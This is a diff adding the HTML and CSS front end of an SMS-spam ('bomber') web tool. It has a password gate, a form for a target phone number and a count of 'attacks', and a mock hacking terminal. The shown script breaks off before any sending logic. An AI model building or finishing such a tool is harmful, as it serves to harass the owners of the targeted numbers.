@@ -1,0 +1,2165 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pritom Sms Spam</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&amp;family=Poppins:wght@300;400;500;600;700;800&amp;display=swap"
+        rel="stylesheet">
+    <link rel="icon" href="https://img.icons8.com/arcade/64/sms.png" type="image/x-icon">
+    <meta name="theme-color" content="#0d1117">
+    <style>
+        :root {
+            --primary-bg: #0d1117;
+            --secondary-bg: #161b22;
+            --glass-bg: rgba(22, 27, 34, 0.8);
+            --accent-blue: #58a6ff;
+            --accent-purple: #bc8cff;
+            --text-primary: #f0f6fc;
+            --text-secondary: #8b949e;
+            --border-color: rgba(240, 246, 252, 0.1);
+            --success-color: #3fb950;
+            --error-color: #f85149;
+            --warning-color: #d29922;
+        }
+
+        body {
+            box-sizing: border-box;
+        }
+
+        * {
+            box-sizing: border-box;
+        }
+
+        html,
+        body {
+            height: 100%;
+            width: 100%;
+            margin: 0;
+            padding: 0;
+            overflow-x: hidden;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: #0a0e27;
+            color: #e6edf3;
+            overflow-x: hidden;
+            min-height: 100%;
+            position: relative;
+        }
+
+        /* Animated Background */
+        .animated-background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            background: linear-gradient(135deg, #0a0e27 0%, #1a1f3a 50%, #0f1729 100%);
+        }
+
+        .animated-background::before {
+            content: '';
+            position: absolute;
+            width: 200%;
+            height: 200%;
+            top: -50%;
+            left: -50%;
+            background:
+                radial-gradient(circle at 20% 50%, rgba(120, 119, 198, 0.15) 0%, transparent 50%),
+                radial-gradient(circle at 80% 80%, rgba(88, 166, 255, 0.12) 0%, transparent 50%),
+                radial-gradient(circle at 40% 20%, rgba(147, 51, 234, 0.1) 0%, transparent 50%);
+            animation: backgroundMove 20s ease-in-out infinite;
+        }
+
+        @keyframes backgroundMove {
+
+            0%,
+            100% {
+                transform: translate(0, 0) rotate(0deg);
+            }
+
+            33% {
+                transform: translate(5%, -5%) rotate(120deg);
+            }
+
+            66% {
+                transform: translate(-5%, 5%) rotate(240deg);
+            }
+        }
+
+        /* Floating Particles */
+        .particle {
+            position: fixed;
+            background: rgba(147, 197, 253, 0.6);
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: -1;
+            animation: float 15s infinite ease-in-out;
+        }
+
+        .particle:nth-child(1) {
+            width: 4px;
+            height: 4px;
+            top: 20%;
+            left: 10%;
+            animation-delay: 0s;
+        }
+
+        .particle:nth-child(2) {
+            width: 6px;
+            height: 6px;
+            top: 60%;
+            left: 80%;
+            animation-delay: 2s;
+        }
+
+        .particle:nth-child(3) {
+            width: 5px;
+            height: 5px;
+            top: 40%;
+            left: 50%;
+            animation-delay: 4s;
+        }
+
+        .particle:nth-child(4) {
+            width: 3px;
+            height: 3px;
+            top: 80%;
+            left: 30%;
+            animation-delay: 6s;
+        }
+
+        .particle:nth-child(5) {
+            width: 7px;
+            height: 7px;
+            top: 15%;
+            left: 70%;
+            animation-delay: 1s;
+        }
+
+        @keyframes float {
+
+            0%,
+            100% {
+                transform: translateY(0) translateX(0);
+                opacity: 0.6;
+            }
+
+            25% {
+                transform: translateY(-20px) translateX(10px);
+                opacity: 1;
+            }
+
+            50% {
+                transform: translateY(-40px) translateX(-10px);
+                opacity: 0.8;
+            }
+
+            75% {
+                transform: translateY(-20px) translateX(5px);
+                opacity: 1;
+            }
+        }
+
+        /* Floating Emojis */
+        .floating-emoji {
+            position: fixed;
+            font-size: 32px;
+            pointer-events: none;
+            z-index: 0;
+            opacity: 0.7;
+            animation: floatEmoji 20s infinite ease-in-out;
+        }
+
+        .floating-emoji:nth-child(6) {
+            top: 10%;
+            left: 5%;
+            animation-delay: 0s;
+            animation-duration: 18s;
+        }
+
+        .floating-emoji:nth-child(7) {
+            top: 25%;
+            left: 85%;
+            animation-delay: 3s;
+            animation-duration: 22s;
+        }
+
+        .floating-emoji:nth-child(8) {
+            top: 50%;
+            left: 15%;
+            animation-delay: 6s;
+            animation-duration: 20s;
+        }
+
+        .floating-emoji:nth-child(9) {
+            top: 70%;
+            left: 75%;
+            animation-delay: 9s;
+            animation-duration: 19s;
+        }
+
+        .floating-emoji:nth-child(10) {
+            top: 35%;
+            left: 90%;
+            animation-delay: 2s;
+            animation-duration: 21s;
+        }
+
+        .floating-emoji:nth-child(11) {
+            top: 80%;
+            left: 20%;
+            animation-delay: 5s;
+            animation-duration: 23s;
+        }
+
+        .floating-emoji:nth-child(12) {
+            top: 15%;
+            left: 60%;
+            animation-delay: 8s;
+            animation-duration: 17s;
+        }
+
+        .floating-emoji:nth-child(13) {
+            top: 60%;
+            left: 40%;
+            animation-delay: 4s;
+            animation-duration: 24s;
+        }
+
+        @keyframes floatEmoji {
+
+            0%,
+            100% {
+                transform: translateY(0) translateX(0) rotate(0deg);
+                opacity: 0.7;
+            }
+
+            25% {
+                transform: translateY(-30px) translateX(20px) rotate(10deg);
+                opacity: 0.9;
+            }
+
+            50% {
+                transform: translateY(-60px) translateX(-15px) rotate(-10deg);
+                opacity: 0.6;
+            }
+
+            75% {
+                transform: translateY(-30px) translateX(15px) rotate(5deg);
+                opacity: 0.8;
+            }
+        }
+
+        /* Glass Notification */
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.18);
+            border-radius: 16px;
+            padding: 16px 24px;
+            min-width: 300px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            z-index: 10000;
+            opacity: 0;
+            transform: translateX(400px);
+            transition: all 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+            cursor: pointer;
+        }
+
+        .notification.show {
+            opacity: 1;
+            transform: translateX(0);
+        }
+
+        .notification.success {
+            border-left: 4px solid #10b981;
+        }
+
+        .notification.error {
+            border-left: 4px solid #ef4444;
+        }
+
+        .notification-content {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .notification-icon {
+            font-size: 24px;
+            flex-shrink: 0;
+        }
+
+        .notification.success .notification-icon {
+            color: #10b981;
+        }
+
+        .notification.error .notification-icon {
+            color: #ef4444;
+        }
+
+        .notification-text {
+            flex: 1;
+        }
+
+        .notification-title {
+            font-weight: 600;
+            font-size: 14px;
+            margin-bottom: 4px;
+        }
+
+        .notification-message {
+            font-size: 13px;
+            opacity: 0.9;
+        }
+
+        /* Container */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* Section Title */
+        .section-title {
+            font-family: 'Poppins', sans-serif;
+            font-size: 48px;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 20px;
+            color: #e6edf3;
+            position: relative;
+            padding-top: 80px;
+            background: linear-gradient(135deg, #93c5fd 0%, #c084fc 50%, #fbbf24 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: gradientShift 8s ease infinite;
+            background-size: 200% 200%;
+        }
+
+        @keyframes gradientShift {
+
+            0%,
+            100% {
+                background-position: 0% 50%;
+            }
+
+            50% {
+                background-position: 100% 50%;
+            }
+        }
+
+        .section-subtitle {
+            text-align: center;
+            font-size: 18px;
+            color: #93c5fd;
+            margin-bottom: 60px;
+            font-weight: 400;
+        }
+
+        /* SMS Sender Section */
+        .sms-sender {
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.02);
+            min-height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .sms-container {
+            width: 100%;
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 0;
+        }
+
+        .sms-card {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 24px;
+            padding: 40px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            animation: fadeInUp 0.6s ease-out;
+            width: 100%;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .sms-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .sms-icon-large {
+            width: 90px;
+            height: 90px;
+            margin: 0 auto 20px;
+            background: linear-gradient(135deg, #6366f1 0%, #8b5cf6 100%);
+            border-radius: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 42px;
+            color: #ffffff;
+            box-shadow: 0 10px 40px rgba(99, 102, 241, 0.5);
+            animation: pulse 2s infinite;
+            position: relative;
+        }
+
+        .sms-icon-large::before {
+            content: '';
+            position: absolute;
+            inset: -3px;
+            background: linear-gradient(135deg, #6366f1, #8b5cf6, #c084fc);
+            border-radius: 24px;
+            z-index: -1;
+            opacity: 0.5;
+            filter: blur(10px);
+        }
+
+        @keyframes pulse {
+
+            0%,
+            100% {
+                transform: scale(1);
+            }
+
+            50% {
+                transform: scale(1.05);
+            }
+        }
+
+        .sms-header h3 {
+            font-family: 'Poppins', sans-serif;
+            font-size: 28px;
+            font-weight: 600;
+            color: #e6edf3;
+            margin-bottom: 8px;
+        }
+
+        .sms-header p {
+            font-size: 15px;
+            color: #93c5fd;
+            font-weight: 400;
+        }
+
+        .sms-remaining {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            margin-top: 12px;
+            padding: 12px 24px;
+            background: rgba(99, 102, 241, 0.2);
+            border: 1px solid rgba(99, 102, 241, 0.4);
+            border-radius: 50px;
+            font-size: 17px;
+            font-weight: 600;
+            color: #93c5fd;
+        }
+
+        .sms-form {
+            margin-top: 30px;
+        }
+
+        .sms-form .form-group {
+            margin-bottom: 20px;
+        }
+
+        .sms-form label {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 10px;
+            color: #e6edf3;
+            font-weight: 500;
+            font-size: 15px;
+        }
+
+        .sms-form label i {
+            font-size: 18px;
+            color: #6366f1;
+        }
+
+        .sms-form input[type="password"],
+        .sms-form input[type="tel"],
+        .sms-form input[type="number"] {
+            width: 100%;
+            padding: 16px 18px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            font-size: 16px;
+            color: #e6edf3;
+            transition: all 0.3s ease;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .sms-form input:focus {
+            outline: none;
+            background: rgba(255, 255, 255, 0.08);
+            border-color: rgba(99, 102, 241, 0.5);
+            box-shadow: 0 0 0 4px rgba(99, 102, 241, 0.15);
+        }
+
+        .sms-form input::placeholder {
+            color: #64748b;
+        }
+
+        .sms-btn {
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            padding: 18px;
+            font-size: 16px;
+            font-weight: 600;
+            border: none;
+            border-radius: 14px;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            margin-top: 12px;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        .sms-btn i {
+            font-size: 18px;
+        }
+
+        .sms-btn-primary {
+            background: linear-gradient(135deg, #6366f1 0%, #8b5cf6 100%);
+            color: #ffffff;
+            box-shadow: 0 10px 30px rgba(99, 102, 241, 0.4);
+        }
+
+        .sms-btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 40px rgba(99, 102, 241, 0.6);
+        }
+
+        .sms-btn-primary:active {
+            transform: translateY(0);
+        }
+
+        .sms-btn-primary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .sms-btn-secondary {
+            background: rgba(239, 68, 68, 0.15);
+            color: #ef4444;
+            border: 1px solid rgba(239, 68, 68, 0.3);
+        }
+
+        .sms-btn-secondary:hover {
+            background: rgba(239, 68, 68, 0.25);
+            border-color: rgba(239, 68, 68, 0.5);
+            transform: translateY(-2px);
+        }
+
+        .sms-message {
+            margin-top: 20px;
+            padding: 16px 18px;
+            border-radius: 12px;
+            font-size: 14px;
+            font-weight: 500;
+            text-align: center;
+            display: none;
+            animation: fadeIn 0.3s ease-in;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+
+            to {
+                opacity: 1;
+            }
+        }
+
+        .sms-message.show {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .sms-message i {
+            font-size: 18px;
+        }
+
+        .sms-message.success {
+            background: rgba(16, 185, 129, 0.15);
+            color: #10b981;
+            border: 1px solid rgba(16, 185, 129, 0.3);
+        }
+
+        .sms-message.error {
+            background: rgba(239, 68, 68, 0.15);
+            color: #ef4444;
+            border: 1px solid rgba(239, 68, 68, 0.3);
+        }
+
+        .sms-message.info {
+            background: rgba(59, 130, 246, 0.15);
+            color: #3b82f6;
+            border: 1px solid rgba(59, 130, 246, 0.3);
+        }
+
+        .sms-info-box {
+            margin-top: 24px;
+            padding: 18px;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 12px;
+            font-size: 14px;
+            color: #93c5fd;
+            display: flex;
+            gap: 14px;
+            line-height: 1.6;
+        }
+
+        .sms-info-box i {
+            font-size: 22px;
+            flex-shrink: 0;
+            color: #6366f1;
+            margin-top: 2px;
+        }
+
+        .sms-info-box strong {
+            color: #e6edf3;
+            display: block;
+            margin-bottom: 8px;
+            font-size: 15px;
+        }
+
+        .sms-info-box ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+
+        .sms-info-box li {
+            padding: 4px 0;
+            padding-left: 20px;
+            position: relative;
+        }
+
+        .sms-info-box li::before {
+            content: '✓';
+            position: absolute;
+            left: 0;
+            color: #10b981;
+            font-weight: bold;
+        }
+
+        /* Hacking Animation Box */
+        .hacking-box {
+            margin-top: 24px;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.9);
+            border: 2px solid #00ff00;
+            border-radius: 12px;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            color: #00ff00;
+            max-height: 300px;
+            overflow-y: auto;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
+            animation: borderPulse 2s infinite;
+            display: none;
+        }
+
+        .hacking-box.show {
+            display: block;
+            animation: slideInUp 0.5s ease-out, borderPulse 2s infinite;
+        }
+
+        @keyframes slideInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes borderPulse {
+
+            0%,
+            100% {
+                border-color: #00ff00;
+                box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
+            }
+
+            50% {
+                border-color: #00cc00;
+                box-shadow: 0 0 30px rgba(0, 255, 0, 0.5);
+            }
+        }
+
+        .hacking-box-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 16px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid #00ff00;
+            font-size: 15px;
+            font-weight: bold;
+        }
+
+        .hacking-box-header i {
+            font-size: 18px;
+            animation: rotate 2s linear infinite;
+        }
+
+        @keyframes rotate {
+            from {
+                transform: rotate(0deg);
+            }
+
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .hacking-terminal {
+            line-height: 1.8;
+        }
+
+        .terminal-line {
+            display: flex;
+            align-items: flex-start;
+            gap: 8px;
+            margin-bottom: 8px;
+            opacity: 0;
+            animation: fadeInTerminal 0.3s ease-out forwards;
+        }
+
+        @keyframes fadeInTerminal {
+            from {
+                opacity: 0;
+                transform: translateX(-10px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        .terminal-prompt {
+            color: #00aa00;
+            font-weight: bold;
+            flex-shrink: 0;
+        }
+
+        .terminal-text {
+            color: #00aa00;
+            word-break: break-all;
+        }
+
+        .terminal-success {
+            color: #00cc00;
+        }
+
+        .terminal-error {
+            color: #cc0000;
+        }
+
+        .terminal-warning {
+            color: #cc8800;
+        }
+
+        .terminal-info {
+            color: #0099cc;
+        }
+
+        .terminal-cursor {
+            display: inline-block;
+            width: 8px;
+            height: 14px;
+            background: #00aa00;
+            margin-left: 4px;
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+
+            0%,
+            49% {
+                opacity: 1;
+            }
+
+            50%,
+            100% {
+                opacity: 0;
+            }
+        }
+
+        .progress-bar-container {
+            margin: 12px 0;
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid #00aa00;
+            border-radius: 4px;
+            height: 20px;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #00aa00, #008800);
+            width: 0%;
+            transition: width 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 11px;
+            font-weight: bold;
+            color: #000;
+        }
+
+
+
+        .hidden {
+            display: none !important;
+        }
+
+        /* Feedback Button */
+        .feedback-btn {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(135deg, #6366f1 0%, #8b5cf6 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            box-shadow: 0 10px 30px rgba(99, 102, 241, 0.4);
+            transition: all 0.3s ease;
+            z-index: 9999;
+            color: #ffffff;
+            font-size: 24px;
+        }
+
+        .feedback-btn:hover {
+            transform: scale(1.1);
+            box-shadow: 0 15px 40px rgba(99, 102, 241, 0.6);
+        }
+
+        .feedback-btn .tooltip {
+            position: absolute;
+            right: 70px;
+            background: rgba(0, 0, 0, 0.8);
+            color: #ffffff;
+            padding: 8px 16px;
+            border-radius: 8px;
+            font-size: 14px;
+            white-space: nowrap;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s ease;
+        }
+
+        .feedback-btn:hover .tooltip {
+            opacity: 1;
+        }
+
+        /* Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 10000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            animation: fadeIn 0.3s ease;
+        }
+
+        .modal.show {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-content {
+            background: rgba(30, 35, 60, 0.95);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 24px;
+            padding: 40px;
+            max-width: 500px;
+            width: 90%;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+            animation: slideUp 0.3s ease;
+            position: relative;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(50px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .close-modal {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            font-size: 32px;
+            font-weight: 300;
+            color: #93c5fd;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            line-height: 1;
+        }
+
+        .close-modal:hover {
+            color: #ef4444;
+            transform: rotate(90deg);
+        }
+
+        .modal-title {
+            font-family: 'Poppins', sans-serif;
+            font-size: 24px;
+            font-weight: 600;
+            color: #e6edf3;
+            margin-bottom: 24px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .modal-title i {
+            color: #6366f1;
+        }
+
+        .modal .form-group {
+            margin-bottom: 20px;
+        }
+
+        .modal .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #e6edf3;
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        .modal select,
+        .modal textarea {
+            width: 100%;
+            padding: 14px 16px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            font-size: 15px;
+            color: #e6edf3;
+            font-family: 'Inter', sans-serif;
+            transition: all 0.3s ease;
+        }
+
+        .modal select {
+            cursor: pointer;
+        }
+
+        .modal textarea {
+            resize: vertical;
+            min-height: 120px;
+        }
+
+        .modal select:focus,
+        .modal textarea:focus {
+            outline: none;
+            background: rgba(255, 255, 255, 0.08);
+            border-color: rgba(99, 102, 241, 0.5);
+            box-shadow: 0 0 0 4px rgba(99, 102, 241, 0.15);
+        }
+
+        .modal textarea::placeholder {
+            color: #64748b;
+        }
+
+        .modal button {
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            padding: 16px;
+            background: linear-gradient(135deg, #6366f1 0%, #8b5cf6 100%);
+            color: #ffffff;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-family: 'Poppins', sans-serif;
+            box-shadow: 0 10px 30px rgba(99, 102, 241, 0.4);
+        }
+
+        .modal button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 40px rgba(99, 102, 241, 0.6);
+        }
+
+        .modal button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* Footer */
+        .footer {
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            padding: 20px;
+            text-align: center;
+            z-index: 100;
+        }
+
+        .footer p {
+            margin: 0;
+            font-size: 14px;
+            color: #93c5fd;
+            font-weight: 400;
+        }
+
+        .footer a {
+            color: #6366f1;
+            text-decoration: none;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+
+        .footer a:hover {
+            color: #8b5cf6;
+            text-shadow: 0 0 10px rgba(99, 102, 241, 0.5);
+        }
+
+        .footer a::after {
+            content: '';
+            position: absolute;
+            width: 0;
+            height: 2px;
+            bottom: -2px;
+            left: 0;
+            background: linear-gradient(90deg, #6366f1, #8b5cf6);
+            transition: width 0.3s ease;
+        }
+
+        .footer a:hover::after {
+            width: 100%;
+        }
+
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .section-title {
+                font-size: 36px;
+                padding-top: 60px;
+            }
+
+            .section-subtitle {
+                font-size: 16px;
+                margin-bottom: 40px;
+            }
+
+            .notification {
+                min-width: calc(100% - 40px);
+                right: 20px;
+                left: 20px;
+            }
+
+            .container {
+                padding: 0 15px;
+            }
+
+            .sms-container {
+                max-width: 100%;
+                padding: 0;
+            }
+
+            .sms-card {
+                padding: 35px 25px;
+                border-radius: 20px;
+            }
+
+            .sms-icon-large {
+                width: 80px;
+                height: 80px;
+                font-size: 36px;
+            }
+
+            .sms-header h3 {
+                font-size: 24px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .section-title {
+                font-size: 28px;
+                padding-top: 50px;
+                margin-bottom: 15px;
+            }
+
+            .section-subtitle {
+                font-size: 15px;
+                margin-bottom: 30px;
+            }
+
+            .sms-sender {
+                padding: 10px 10px 80px;
+            }
+
+            .container {
+                padding: 0 10px;
+            }
+
+            .sms-container {
+                max-width: 100%;
+                padding: 0;
+            }
+
+            .sms-card {
+                padding: 30px 20px;
+                border-radius: 18px;
+            }
+
+            .sms-icon-large {
+                width: 70px;
+                height: 70px;
+                font-size: 32px;
+            }
+
+            .sms-header h3 {
+                font-size: 22px;
+            }
+
+            .footer {
+                padding: 15px 10px;
+            }
+
+            .footer p {
+                font-size: 12px;
+            }
+        }
+
+        .ABDULLHA {
+            width: 120px;
+            height: 120px;
+            background: url('https://i.ibb.co.com/kVHr6m72/Hitube-sq-P6vx-GJD6-2025-11-18-15-15-05.jpg') no-repeat center center;
+            background-size: cover;
+            border-radius: 50%;
+            margin: 0 auto;
+            border: 3px solid #715dbc;
+        }
+
+        ::-webkit-scrollbar {
+            width: 5px
+        }
+
+        ::-webkit-scrollbar-track {
+            background: #000000
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background-color: #6366f1;
+        }
+    </style>
+    <script src="https://cdn.tailwindcss.com" type="text/javascript"></script>
+</head>
+
+<body>
+    <!-- Animated Background -->
+    <div class="animated-background"></div>
+    <!-- Floating Particles -->
+    <div class="particle"></div>
+    <div class="particle"></div>
+    <div class="particle"></div>
+    <div class="particle"></div>
+    <div class="particle"></div>
+    <!-- Floating Emojis -->
+    <div class="floating-emoji">
+        💀
+    </div>
+    <div class="floating-emoji">
+        💣
+    </div>
+    <div class="floating-emoji">
+        📨
+    </div>
+    <div class="floating-emoji">
+        📡
+    </div>
+    <div class="floating-emoji">
+        💥
+    </div>
+    <div class="floating-emoji">
+        🔰
+    </div>
+    <div class="floating-emoji">
+        ☢️
+    </div>
+    <div class="floating-emoji">
+        🚀
+    </div>
+
+    <!-- Glass Notification -->
+    <div id="notification" class="notification">
+        <div class="notification-content"><i class="notification-icon fas fa-check-circle"></i>
+            <div class="notification-text">
+                <div class="notification-title">
+                    Success!
+                </div>
+                <div class="notification-message">
+                    Your action was completed successfully.
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- SMS Sender Section -->
+    <section class="sms-sender">
+        <div class="container">
+            <!-- SMS Login Screen -->
+            <div id="smsLoginScreen" class="sms-container">
+                <div class="sms-card">
+                    <div class="sms-header">
+                        <div class="sms-icon-large"><i class="fas fa-lock"></i>
+                        </div>
+                        <h3 class="section-title" id="smsTitle" style="padding-top: 0; margin-bottom: 10px;">Secure
+                            Login
+                        </h3>
+                        <p id="loginSubtitle">Enter your password to access SMS sending</p>
+                    </div>
+                    <div class="sms-form">
+                        <div class="form-group"><label for="smsPassword"> <i class="fas fa-key"></i>
+                                <span>Password</span> </label> <input type="password" id="smsPassword"
+                                placeholder="Enter your password" required>
+                        </div><button class="sms-btn sms-btn-primary" id="smsLoginBtn"> <i
+                                class="fas fa-sign-in-alt"></i> <span>Login Now</span> </button>
+                    </div>
+                    <div id="smsLoginMessage" class="sms-message"></div>
+                </div>
+            </div>
+            <!-- SMS Send Screen -->
+            <div id="smsSendScreen" class="sms-container hidden">
+                <div class="sms-card">
+                    <div class="sms-header">
+                        <div class="ABDULLHA"></div>
+                        <h3 class="section-title" id="smsTitle" style="padding-top: 7px; margin-bottom: 10px;">
+                            プリトム ビスワス
+                        </h3>
+                        <div class="sms-remaining"><i class="fas fa-envelope"></i> <span id="smsRemaining">
+                                SMS SPAM</span>
+                        </div>
+                    </div>
+                    <div class="sms-form">
+                        <div class="form-group"><label for="smsPhoneNumber"> <i class="fas fa-mobile-alt"></i>
+                                <span>Phone Number</span> </label> <input type="tel" id="smsPhoneNumber"
+                                placeholder="01712345678" pattern="[0-9]{11}" required> <small
+                                style="display: block; margin-top: 6px; color: #64748b; font-size: 13px;">Enter 11 digit
+                                number (no country code)</small>
+                        </div>
+                        <div class="form-group"><label for="smsAmount"> <i class="fas fa-sort-numeric-up"></i>
+                                <span>Amount (Max 10)</span> </label> <input type="number" id="smsAmount" min="1"
+                                max="10" value="1" required> <small
+                                style="display: block; margin-top: 6px; color: #64748b; font-size: 13px;">Number of
+                                attacks</small>
+                        </div><button class="sms-btn sms-btn-primary" id="smsSendBtn"> <i
+                                class="fas fa-paper-plane"></i> <span>Send SMS</span> </button>
+                    </div>
+                    <div id="smsSendMessage" class="sms-message"></div>
+                    <!-- Hacking Animation Box -->
+                    <div id="hackingBox" class="hacking-box">
+                        <div class="hacking-box-header"><i class="fas fa-terminal"></i> <span>ATTACK TERMINAL - SYSTEM
+                                INITIATED</span>
+                        </div>
+                        <div id="hackingTerminal" class="hacking-terminal"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    <footer class="footer">
+        <p>© 2025 SMS SEND - BY <a href="https://www.facebook.com/PRITOMBISWAS77220" target="_blank"
+                rel="noopener noreferrer">PRITOM</a></p>
+    </footer>
+    <!-- Feedback Button -->
+    <div class="feedback-btn" id="feedbackBtn"><i class="fas fa-comment-dots"></i> <span class="tooltip">Send
+            Feedback</span>
+    </div>
+    <!-- Feedback Modal -->
+    <div class="modal" id="feedbackModal">
+        <div class="modal-content"><span class="close-modal" id="closeModal">×</span>
+            <h3 class="modal-title"><i class="fas fa-comment-alt"></i> Send Feedback</h3>
+            <div class="form-group"><label for="feedbackType">Feedback Type</label> <select id="feedbackType">
+                    <option value="suggestion">💡 Suggestion</option>
+                    <option value="bug">🐛 Bug Report</option>
+                    <option value="compliment">🎉 Compliment</option>
+                    <option value="other">📝 Other</option>
+                </select>
+            </div>
+            <div class="form-group"><label for="feedbackMessage">Your Feedback</label> <textarea id="feedbackMessage"
+                    rows="5" placeholder="Please share your thoughts, suggestions, or issues..."></textarea>
+            </div><button id="sendFeedbackBtn"> <i class="fas fa-paper-plane"></i> <span>Send Feedback</span> <i
+                    class="fas fa-spinner fa-spin" id="feedbackSpinner" style="display: none;"></i> </button>
+        </div>
+    </div>
+    <script>
+        // Notification System
+        let notificationTimeout;
+
+        function showNotification(type, title, message) {
+            const notification = document.getElementById('notification');
+            const icon = notification.querySelector('.notification-icon');
+            const titleEl = notification.querySelector('.notification-title');
+            const messageEl = notification.querySelector('.notification-message');
+
+            // Clear existing timeout
+            if (notificationTimeout) {
+                clearTimeout(notificationTimeout);
+            }
+
+            // Set notification content
+            titleEl.textContent = title;
+            messageEl.textContent = message;
+
+            // Set icon based on type
+            if (type === 'success') {
+                icon.className = 'notification-icon fas fa-check-circle';
+                notification.className = 'notification success';
+            } else if (type === 'error') {
